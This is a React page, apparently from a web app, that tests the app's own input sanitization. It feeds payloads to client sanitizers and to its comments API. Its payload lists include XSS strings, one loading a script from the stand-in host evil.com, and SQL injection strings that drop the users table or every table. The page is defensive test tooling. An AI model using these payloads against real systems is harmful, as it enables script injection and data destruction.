'use client';

import { useState } from 'react';
import { sanitizeHtmlClient, sanitizeRichTextClient, stripHtmlClient } from '@/lib/sanitizeClient';
import { authFetch } from '@/lib/authClient';
import toast from 'react-hot-toast';

// Dangerous XSS payloads for testing
const xssPayloads = [
  '<script>alert("XSS Attack!")</script>',
  '<img src=x onerror="alert(\'XSS\')">',
  '<svg onload="alert(\'XSS\')">',
  'javascript:alert("XSS")',
  '<iframe src="javascript:alert(\'XSS\')"></iframe>',
  '<body onload="alert(\'XSS\')">',
  '<input onfocus="alert(\'XSS\')" autofocus>',
  '<marquee onstart="alert(\'XSS\')">',
  '"><script>alert(String.fromCharCode(88,83,83))</script>',
  '<SCRIPT SRC=http://evil.com/xss.js></SCRIPT>',
];

// SQL Injection payloads for testing
const sqlInjectionPayloads = [
  "' OR '1'='1",
  "' OR 1=1--",
  "admin'--",
  "' UNION SELECT NULL--",
  "1'; DROP TABLE users--",
  "' OR 'x'='x",
  "'; EXEC sp_MSForEachTable 'DROP TABLE ?'--",
  "1' AND '1'='1",
];

export default function TestSanitizationPage() {
  const [inputText, setInputText] = useState('');
  const [sanitizedStrict, setSanitizedStrict] = useState('');
  const [sanitizedBasic, setSanitizedBasic] = useState('');
  const [sanitizedRich, setSanitizedRich] = useState('');
  const [loading, setLoading] = useState(false);
  const [testResults, setTestResults] = useState<Array<{
    input: string;
    output: string;
    blocked: boolean;
  }>>([]);

  const handleSanitize = () => {
    const stripped = stripHtmlClient(inputText);
    const basic = sanitizeHtmlClient(inputText);
    const rich = sanitizeRichTextClient(inputText);

    setSanitizedStrict(stripped);
    setSanitizedBasic(basic);
    setSanitizedRich(rich);
  };

  const testXSSPayload = async (payload: string) => {
    setLoading(true);
    try {
      const response = await authFetch.post('/api/comments', {
        content: payload,
        authorName: 'XSS Tester',
      });

      const data = await response.json();

      if (data.success) {
        const wasBlocked = data.data.content !== payload;
        setTestResults(prev => [...prev, {
          input: payload,
          output: data.data.content,
          blocked: wasBlocked,
        }]);

        if (wasBlocked) {
          toast.success('XSS payload blocked successfully!');
        } else {
          toast.error('WARNING: XSS payload NOT blocked!');
        }
      } else {
        toast.error('Request failed: ' + data.message);
      }
    } catch {
      toast.error('Error testing payload');
    } finally {
      setLoading(false);
    }
  };

  const testAllXSS = async () => {
    setTestResults([]);
    for (const payload of xssPayloads.slice(0, 5)) {
      await testXSSPayload(payload);
      await new Promise(resolve => setTimeout(resolve, 500));
    }
  };

  const quickFillXSS = (payload: string) => {
    setInputText(payload);
  };

  return (
    <div className="min-h-screen bg-gradient-to-br from-red-50 via-orange-50 to-yellow-50 dark:from-gray-900 dark:via-red-900/20 dark:to-gray-900 p-8">
      <div className="max-w-7xl mx-auto">
        <h1 className="text-4xl font-bold mb-8 bg-gradient-to-r from-red-600 via-orange-600 to-yellow-600 bg-clip-text text-transparent">
          🛡️ OWASP Input Sanitization Testing
        </h1>

        {/* Introduction */}
        <div className="bg-gradient-to-r from-red-100 to-orange-100 dark:from-red-900/30 dark:to-orange-900/30 rounded-lg p-6 mb-6 border-2 border-red-500">
          <h2 className="text-2xl font-semibold mb-3 text-gray-900 dark:text-white">
            ⚠️ Security Testing Dashboard
          </h2>
          <p className="text-gray-700 dark:text-gray-300 mb-2">
            This page demonstrates input sanitization to prevent <strong>XSS (Cross-Site Scripting)</strong> and <strong>SQL Injection</strong> attacks.
          </p>
          <ul className="list-disc list-inside space-y-1 text-sm text-gray-600 dark:text-gray-400">
            <li><strong>XSS</strong>: Malicious scripts injected into web pages</li>
            <li><strong>SQL Injection</strong>: Malicious SQL commands to manipulate databases</li>
            <li><strong>Sanitization</strong>: Removing/escaping dangerous content</li>
          </ul>
        </div>

        {/* Manual Testing */}
        <div className="grid grid-cols-1 lg:grid-cols-2 gap-6 mb-6">
          {/* Input Section */}
          <div className="bg-white dark:bg-gray-800 rounded-lg shadow-lg p-6 border border-gray-200 dark:border-gray-700">
            <h2 className="text-2xl font-semibold mb-4 text-gray-900 dark:text-white">
              1. Test Input
            </h2>
            
            <textarea
              value={inputText}
              onChange={(e) => setInputText(e.target.value)}
              className="w-full h-32 px-4 py-2 rounded-lg border border-gray-300 dark:border-gray-600 bg-white dark:bg-gray-700 text-gray-900 dark:text-white font-mono text-sm mb-4"
              placeholder="Enter text or malicious payload to test..."
            />

            <div className="flex flex-wrap gap-2 mb-4">
              <button
                onClick={handleSanitize}
                className="px-4 py-2 bg-gradient-to-r from-accent-purple to-accent-pink text-white rounded-lg font-medium hover:shadow-lg transition-shadow"
              >
                Sanitize Input
              </button>
              <button
                onClick={() => setInputText('')}
                className="px-4 py-2 bg-gray-600 text-white rounded-lg font-medium hover:bg-gray-700"
              >
                Clear
              </button>
            </div>

            <div className="space-y-2">
              <p className="text-sm font-semibold text-gray-700 dark:text-gray-300">Quick Fill XSS Payloads:</p>
              <div className="flex flex-wrap gap-2">
                {xssPayloads.slice(0, 3).map((payload, i) => (
                  <button
                    key={i}
                    onClick={() => quickFillXSS(payload)}
                    className="px-3 py-1 bg-red-100 dark:bg-red-900/30 text-red-700 dark:text-red-300 rounded text-xs hover:bg-red-200 dark:hover:bg-red-900/50"
                  >
                    Payload {i + 1}
                  </button>
                ))}
              </div>
            </div>

            <div className="mt-4 space-y-2">
              <p className="text-sm font-semibold text-gray-700 dark:text-gray-300">SQL Injection Examples:</p>
              <div className="flex flex-wrap gap-2">
                {sqlInjectionPayloads.slice(0, 3).map((payload, i) => (
                  <button
                    key={i}
                    onClick={() => quickFillXSS(payload)}
                    className="px-3 py-1 bg-orange-100 dark:bg-orange-900/30 text-orange-700 dark:text-orange-300 rounded text-xs hover:bg-orange-200 dark:hover:bg-orange-900/50"
                  >
                    SQL {i + 1}
                  </button>
                ))}
              </div>
            </div>
          </div>

          {/* Output Section */}
          <div className="bg-white dark:bg-gray-800 rounded-lg shadow-lg p-6 border border-gray-200 dark:border-gray-700">
            <h2 className="text-2xl font-semibold mb-4 text-gray-900 dark:text-white">
              2. Sanitized Output
            </h2>

            <div className="space-y-4">
              <div>
                <h3 className="text-sm font-semibold text-gray-700 dark:text-gray-300 mb-2">
                  Strict (All HTML removed):
                </h3>
                <div className="bg-gray-100 dark:bg-gray-900 rounded-lg p-3 min-h-[60px] font-mono text-sm break-all">
                  {sanitizedStrict || <span className="text-gray-400">No output yet...</span>}
                </div>
              </div>

              <div>
                <h3 className="text-sm font-semibold text-gray-700 dark:text-gray-300 mb-2">
                  Basic (Safe HTML only):
                </h3>
                <div className="bg-gray-100 dark:bg-gray-900 rounded-lg p-3 min-h-[60px] font-mono text-sm break-all">
                  {sanitizedBasic || <span className="text-gray-400">No output yet...</span>}
                </div>
              </div>

              <div>
                <h3 className="text-sm font-semibold text-gray-700 dark:text-gray-300 mb-2">
                  Rich Text (More HTML allowed):
                </h3>
                <div className="bg-gray-100 dark:bg-gray-900 rounded-lg p-3 min-h-[60px] font-mono text-sm break-all">
                  {sanitizedRich || <span className="text-gray-400">No output yet...</span>}
                </div>
              </div>
            </div>
          </div>
        </div>

        {/* Automated Testing */}
        <div className="bg-white dark:bg-gray-800 rounded-lg shadow-lg p-6 mb-6 border border-gray-200 dark:border-gray-700">
          <h2 className="text-2xl font-semibold mb-4 text-gray-900 dark:text-white">
            3. Automated XSS Testing
          </h2>
          <p className="text-sm text-gray-600 dark:text-gray-400 mb-4">
            Test common XSS payloads against the API endpoint to verify sanitization.
          </p>

          <button
            onClick={testAllXSS}
            disabled={loading}
            className="px-6 py-3 bg-gradient-to-r from-red-600 to-orange-600 text-white rounded-lg font-medium hover:shadow-lg transition-shadow disabled:opacity-50"
          >
            {loading ? 'Testing...' : 'Run XSS Attack Tests'}
          </button>

          {testResults.length > 0 && (
            <div className="mt-6 space-y-3">
              <h3 className="font-semibold text-gray-900 dark:text-white">Test Results:</h3>
              {testResults.map((result, i) => (
                <div
                  key={i}
                  className={`p-3 rounded-lg border-2 ${
                    result.blocked
                      ? 'bg-green-50 dark:bg-green-900/20 border-green-500'
                      : 'bg-red-50 dark:bg-red-900/20 border-red-500'
                  }`}
                >
                  <div className="flex items-start justify-between mb-2">
                    <span className="text-xs font-semibold text-gray-600 dark:text-gray-400">
                      Test #{i + 1}
                    </span>
                    <span className={`text-xs font-bold ${result.blocked ? 'text-green-600' : 'text-red-600'}`}>
                      {result.blocked ? '✅ BLOCKED' : '❌ NOT BLOCKED'}
                    </span>
                  </div>
                  <div className="text-xs space-y-1">
                    <div>
                      <span className="font-semibold">Input:</span>
                      <pre className="bg-gray-100 dark:bg-gray-900 p-2 rounded mt-1 overflow-x-auto">
                        {result.input}
                      </pre>
                    </div>
                    <div>
                      <span className="font-semibold">Output:</span>
                      <pre className="bg-gray-100 dark:bg-gray-900 p-2 rounded mt-1 overflow-x-auto">
                        {result.output}
                      </pre>
                    </div>
                  </div>
                </div>
              ))}
            </div>
          )}
        </div>

        {/* Comparison Table */}
        <div className="bg-white dark:bg-gray-800 rounded-lg shadow-lg p-6 border border-gray-200 dark:border-gray-700">
          <h2 className="text-2xl font-semibold mb-4 text-gray-900 dark:text-white">
            4. Before & After Comparison
          </h2>
          <div className="overflow-x-auto">
            <table className="w-full text-sm">
              <thead className="bg-gray-100 dark:bg-gray-700">
                <tr>
                  <th className="px-4 py-2 text-left">Attack Type</th>
                  <th className="px-4 py-2 text-left">Payload (Before)</th>
                  <th className="px-4 py-2 text-left">Sanitized (After)</th>
                  <th className="px-4 py-2 text-center">Status</th>
                </tr>
              </thead>
              <tbody className="divide-y divide-gray-200 dark:divide-gray-700">
                <tr>
                  <td className="px-4 py-2 font-semibold">XSS Script Tag</td>
                  <td className="px-4 py-2 font-mono text-xs">&lt;script&gt;alert(&apos;XSS&apos;)&lt;/script&gt;</td>
                  <td className="px-4 py-2 font-mono text-xs text-green-600">(empty string)</td>
                  <td className="px-4 py-2 text-center">✅</td>
                </tr>
                <tr>
                  <td className="px-4 py-2 font-semibold">XSS Image Tag</td>
                  <td className="px-4 py-2 font-mono text-xs">&lt;img src=x onerror=&quot;alert()&quot;&gt;</td>
                  <td className="px-4 py-2 font-mono text-xs text-green-600">(removed)</td>
                  <td className="px-4 py-2 text-center">✅</td>
                </tr>
                <tr>
                  <td className="px-4 py-2 font-semibold">SQL Injection</td>
                  <td className="px-4 py-2 font-mono text-xs">&apos; OR &apos;1&apos;=&apos;1</td>
                  <td className="px-4 py-2 font-mono text-xs text-green-600">&apos; OR &apos;1&apos;=&apos;1 (escaped)</td>
                  <td className="px-4 py-2 text-center">✅</td>
                </tr>
                <tr>
                  <td className="px-4 py-2 font-semibold">Safe HTML</td>
                  <td className="px-4 py-2 font-mono text-xs">&lt;p&gt;Hello &lt;strong&gt;World&lt;/strong&gt;&lt;/p&gt;</td>
                  <td className="px-4 py-2 font-mono text-xs text-blue-600">&lt;p&gt;Hello &lt;strong&gt;World&lt;/strong&gt;&lt;/p&gt;</td>
                  <td className="px-4 py-2 text-center">✅</td>
                </tr>
              </tbody>
            </table>
          </div>
        </div>

        {/* Security Measures */}
        <div className="mt-6 bg-gradient-to-r from-green-100 to-cyan-100 dark:from-green-900/30 dark:to-cyan-900/30 rounded-lg p-6 border border-green-500">
          <h3 className="text-xl font-semibold mb-3 text-gray-900 dark:text-white">
            🔒 Implemented Security Measures
          </h3>
          <ul className="grid grid-cols-1 md:grid-cols-2 gap-2 text-sm text-gray-700 dark:text-gray-300">
            <li>✅ Input sanitization (server & client)</li>
            <li>✅ Output encoding before rendering</li>
            <li>✅ Parameterized queries (Prisma ORM)</li>
            <li>✅ Zod schema validation</li>
            <li>✅ HTML tag allowlist (whitelist)</li>
            <li>✅ Attribute sanitization</li>
            <li>✅ URL protocol validation</li>
            <li>✅ Filename sanitization</li>
            <li>✅ Security headers (CSP, XSS Protection)</li>
            <li>✅ Rate limiting</li>
            <li>✅ Audit logging</li>
            <li>✅ OWASP compliance</li>
          </ul>
        </div>
      </div>
    </div>
  );
}
